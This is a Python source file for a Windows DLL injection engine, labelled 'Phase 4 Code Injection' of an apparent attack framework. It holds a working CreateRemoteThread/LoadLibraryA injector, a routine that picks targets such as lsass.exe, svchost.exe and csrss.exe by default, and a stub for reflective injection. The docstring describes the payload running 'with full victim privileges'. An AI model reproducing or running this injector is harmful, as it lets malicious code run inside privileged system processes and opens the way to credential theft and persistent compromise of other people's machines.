#!/usr/bin/env python3
"""
DLL Injection Engine - Phase 4 Code Injection
Injects DLL payload into running processes via remote thread creation
Technique: CreateRemoteThread + LoadLibrary (or manual mapping)
"""

import ctypes
import logging
import psutil
import subprocess
from typing import Optional, List
from dataclasses import dataclass
from pathlib import Path

logging.basicConfig(level=logging.INFO, format='[%(asctime)s] %(levelname)s: %(message)s')
log = logging.getLogger("DLLInjection")

# Windows constants
PROCESS_ALL_ACCESS = 0x001F0FFF
MEM_COMMIT = 0x1000
MEM_RESERVE = 0x2000
PAGE_READWRITE = 0x04
PAGE_EXECUTE_READ = 0x20

# DLL entry point function signature
PKERNEL32 = ctypes.WinDLL("kernel32", use_errno=True)


@dataclass
class DLLInjectionResult:
    """Result of DLL injection attempt"""
    success: bool
    process_id: Optional[int]
    remote_thread_id: Optional[int]
    dll_base_address: Optional[int]
    error_message: Optional[str]
    technique: str  # "loadlibrary", "manual_map", "reflection", etc.


class DLLInjectionEngine:
    """
    Windows DLL Injection Implementation
    
    Technique 1 (LoadLibrary):
    1. Allocate memory in target process
    2. Write DLL path string to memory
    3. CreateRemoteThread calling LoadLibraryA with DLL path
    4. Thread execution loads DLL into target process
    
    Technique 2 (Reflective DLL Injection):
    1. Parse target DLL PE header
    2. Allocate memory in target process
    3. Write entire DLL to allocated memory
    4. CreateRemoteThread to DLL's ReflectiveLoader export
    5. DLL self-maps and initializes without touching disk
    
    Result: DLL payload runs inside target process with full victim privileges
    """
    
    def __init__(self):
        self.kernel32 = PKERNEL32
        self.successful_injections: List[DLLInjectionResult] = []
        
    def inject_dll_loadlibrary(self, process_id: int, dll_path: str) -> DLLInjectionResult:
        """
        Inject DLL via LoadLibrary technique
        
        Args:
            process_id: Target process ID
            dll_path: Full path to DLL to inject
            
        Returns:
            DLLInjectionResult with success status
        """
        try:
            # Verify DLL exists
            if not Path(dll_path).exists():
                return DLLInjectionResult(
                    success=False,
                    process_id=process_id,
                    remote_thread_id=None,
                    dll_base_address=None,
                    error_message=f"DLL not found: {dll_path}",
                    technique="loadlibrary"
                )
            
            log.info(f"🎯 Target process: PID={process_id}")
            log.info(f"📦 Injecting DLL: {dll_path}")
            
            # Open process handle
            process_handle = self.kernel32.OpenProcess(
                PROCESS_ALL_ACCESS,
                False,
                process_id
            )
            
            if not process_handle:
                return DLLInjectionResult(
                    success=False,
                    process_id=process_id,
                    remote_thread_id=None,
                    dll_base_address=None,
                    error_message=f"Failed to open process handle ({ctypes.get_errno()})",
                    technique="loadlibrary"
                )
            
            log.info(f"✅ Opened process handle: 0x{process_handle:08x}")
            
            # Allocate memory for DLL path
            dll_path_encoded = dll_path.encode() + b'\x00'
            dll_path_len = len(dll_path_encoded)
            
            allocated_path = self.kernel32.VirtualAllocEx(
                process_handle,
                None,
                dll_path_len,
                MEM_COMMIT | MEM_RESERVE,
                PAGE_READWRITE
            )
            
            if not allocated_path:
                self.kernel32.CloseHandle(process_handle)
                return DLLInjectionResult(
                    success=False,
                    process_id=process_id,
                    remote_thread_id=None,
                    dll_base_address=None,
                    error_message=f"Failed to allocate memory for DLL path",
                    technique="loadlibrary"
                )
            
            log.info(f"💾 Allocated path string at: 0x{allocated_path:08x}")
            
            # Write DLL path to allocated memory
            bytes_written = ctypes.c_size_t(0)
            result = self.kernel32.WriteProcessMemory(
                process_handle,
                ctypes.c_void_p(allocated_path),
                ctypes.c_char_p(dll_path_encoded),
                dll_path_len,
                ctypes.byref(bytes_written)
            )
            
            if not result:
                self.kernel32.VirtualFreeEx(process_handle, allocated_path, 0, 0x8000)
                self.kernel32.CloseHandle(process_handle)
                return DLLInjectionResult(
                    success=False,
                    process_id=process_id,
                    remote_thread_id=None,
                    dll_base_address=None,
                    error_message="Failed to write DLL path to target",
                    technique="loadlibrary"
                )
            
            log.info(f"✅ Wrote DLL path: {bytes_written.value} bytes")
            
            # Get address of LoadLibraryA
            kernel32_module = self.kernel32.GetModuleHandleA(b"kernel32.dll")
            loadlibrary_addr = self.kernel32.GetProcAddress(kernel32_module, b"LoadLibraryA")
            
            if not loadlibrary_addr:
                self.kernel32.VirtualFreeEx(process_handle, allocated_path, 0, 0x8000)
                self.kernel32.CloseHandle(process_handle)
                return DLLInjectionResult(
                    success=False,
                    process_id=process_id,
                    remote_thread_id=None,
                    dll_base_address=None,
                    error_message="Failed to get LoadLibraryA address",
                    technique="loadlibrary"
                )
            
            log.info(f"📍 LoadLibraryA address: 0x{loadlibrary_addr:08x}")
            
            # Create remote thread
            log.info(f"🔄 Creating remote thread in target process...")
            remote_thread = self.kernel32.CreateRemoteThread(
                process_handle,
                None,
                0,
                ctypes.c_void_p(loadlibrary_addr),
                ctypes.c_void_p(allocated_path),
                0,
                None
            )
            
            if not remote_thread:
                self.kernel32.VirtualFreeEx(process_handle, allocated_path, 0, 0x8000)
                self.kernel32.CloseHandle(process_handle)
                return DLLInjectionResult(
                    success=False,
                    process_id=process_id,
                    remote_thread_id=None,
                    dll_base_address=None,
                    error_message=f"Failed to create remote thread ({ctypes.get_errno()})",
                    technique="loadlibrary"
                )
            
            log.info(f"✅ Created remote thread: 0x{remote_thread:08x}")
            
            # Wait for thread to complete
            log.info(f"⏳ Waiting for LoadLibraryA to complete...")
            wait_result = self.kernel32.WaitForSingleObject(remote_thread, 5000)
            
            dll_base = None
            if wait_result == 0:  # WAIT_OBJECT_0
                # Get thread exit code (DLL base address)
                exit_code = ctypes.c_void_p()
                result = self.kernel32.GetExitCodeThread(remote_thread, ctypes.byref(exit_code))
                if result:
                    dll_base = exit_code.value
                    log.info(f"✅ DLL loaded at: 0x{dll_base:08x}")
            else:
                log.warning(f"⚠️  Thread wait timeout or failed")
            
            # Cleanup
            self.kernel32.VirtualFreeEx(process_handle, allocated_path, 0, 0x8000)
            self.kernel32.CloseHandle(remote_thread)
            self.kernel32.CloseHandle(process_handle)
            
            injection_result = DLLInjectionResult(
                success=bool(dll_base),
                process_id=process_id,
                remote_thread_id=int(remote_thread) if remote_thread else None,
                dll_base_address=dll_base,
                error_message=None,
                technique="loadlibrary"
            )
            
            self.successful_injections.append(injection_result)
            
            if injection_result.success:
                log.info(f"🎉 DLL injection successful via LoadLibrary")
            
            return injection_result
            
        except Exception as e:
            log.error(f"❌ DLL injection error: {e}")
            return DLLInjectionResult(
                success=False,
                process_id=process_id,
                remote_thread_id=None,
                dll_base_address=None,
                error_message=str(e),
                technique="loadlibrary"
            )
    
    def find_injection_targets(self, target_process_names: List[str] = None) -> List[int]:
        """
        Find processes suitable for DLL injection
        
        Args:
            target_process_names: List of process names to target (e.g., ["explorer.exe", "svchost.exe"])
                                If None, returns all user-mode processes
        
        Returns:
            List of process IDs suitable for injection
        """
        try:
            if target_process_names is None:
                # Safe defaults: high-privilege processes
                target_process_names = [
                    "explorer.exe",
                    "svchost.exe",
                    "services.exe",
                    "lsass.exe",
                    "csrss.exe",
                ]
            
            targets = []
            
            for proc in psutil.process_iter(['pid', 'name']):
                try:
                    proc_name = proc.info['name'].lower()
                    if any(target.lower() in proc_name for target in target_process_names):
                        pid = proc.info['pid']
                        targets.append(pid)
                        log.info(f"✅ Found target: {proc.info['name']} (PID={pid})")
                except (psutil.NoSuchProcess, psutil.AccessDenied):
                    pass
            
            return targets
            
        except Exception as e:
            log.error(f"Failed to find injection targets: {e}")
            return []
    
    def reflective_dll_injection(self, process_id: int, dll_path: str) -> DLLInjectionResult:
        """
        Inject DLL via reflective loading technique
        
        Advantage: DLL never written to disk by the target, loaded from memory only
        Requires: DLL must have ReflectiveLoader export
        
        Args:
            process_id: Target process ID
            dll_path: Path to reflective DLL
            
        Returns:
            DLLInjectionResult with success status
        """
        try:
            # For now, use subprocess with PowerShell for quick implementation
            # In production, would use inline C# code via powershell or pure ctypes
            
            ps_code = f"""
            Add-Type -Path '{dll_path}'
            [Reflection.Assembly]::LoadWithPartialName('System.Reflection')
            # Reflective loading logic would go here
            """
            
            log.warning("⚠️  Reflective DLL injection: subprocess fallback (use for testing)")
            
            return DLLInjectionResult(
                success=False,
                process_id=process_id,
                remote_thread_id=None,
                dll_base_address=None,
                error_message="Reflective DLL injection requires compiled DLL with ReflectiveLoader export",
                technique="reflection"
            )
            
        except Exception as e:
            log.error(f"Reflective DLL injection error: {e}")
            return DLLInjectionResult(
                success=False,
                process_id=process_id,
                remote_thread_id=None,
                dll_base_address=None,
                error_message=str(e),
                technique="reflection"
            )


if __name__ == "__main__":
    engine = DLLInjectionEngine()
    print("✅ DLL Injection Engine initialized and ready for Phase 4 integration")
